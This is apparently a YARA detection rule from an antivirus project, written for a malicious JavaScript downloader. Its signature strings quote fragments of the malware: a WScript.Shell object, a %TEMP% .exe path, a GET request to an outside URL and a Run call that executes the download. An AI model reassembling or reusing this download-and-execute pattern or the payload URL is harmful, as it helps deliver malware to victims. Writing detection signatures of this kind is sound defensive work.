rule sig_20160329_603414447ca4ada0ca6b909049ec8801 {
  meta:
    description = "datamaliciousorder - file 20160329_603414447ca4ada0ca6b909049ec8801.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e7f1c7b8e25519180a9ef43510c23130b1beadc7f08fd975364d7a17eda1ede"

  strings:
    $s1  = "function Pxbmibkq() {return Pcpot[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"CKQ0ndte3O.exe\";};" fullword ascii
    $s2  = "Vcupktubni[Jugvoyp](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Ttwlo](Zanbbngvag() * 11)} while (Vcupktubni[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Pcpot = function Jtrbaj() {return WScript[Suohogqd](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qhbqbw(Ysakmaz, Nvroe){return Ysakmaz - Nvroe;};" fullword ascii
    $s6  = "function Qypfrhvzq(Rnbrnlcexk){Pcpot[\"Run\"](Rnbrnlcexk, Zkirkq, Zkirkq);};" fullword ascii
    $s7  = "function Zanbbngvag(){return 22;};" fullword ascii
    $s8  = "function Tmbywusgr(){return Suohogqd;};" fullword ascii
    $s9  = "Ugfjnjdq = true; " fullword ascii
    $s10 = " while (Ytbedujd){" fullword ascii
    $s11 = "function Yxornvljf(){return Ewxzyrz;};" fullword ascii
    $s12 = "var Ugfjnjdq = false;" fullword ascii
    $s13 = "function Zcrzvnu(Qcklpbtf) {var Mhazdp = (1, 2, 3, 4, 5, Qcklpbtf); return Mhazdp;};" fullword ascii
    $s14 = "var Ckgitv = new this[\"Date\"]();" fullword ascii
    $s15 = "function Omzcxwaqcg()" fullword ascii
    $s16 = "return Qhbqbw(Wgkfhxpc, Clnpda);" fullword ascii
    $s17 = "var Olrxyx = false;" fullword ascii
    $s18 = "function Zuxtag() {return ((Fdnyca == true) && (Fdnyca == Ugfjnjdq)) ? 1 : Zkirkq;};" fullword ascii
    $s19 = "} catch(Zknthiisc){Ytbedujd = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s20 = "Fdnyca = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}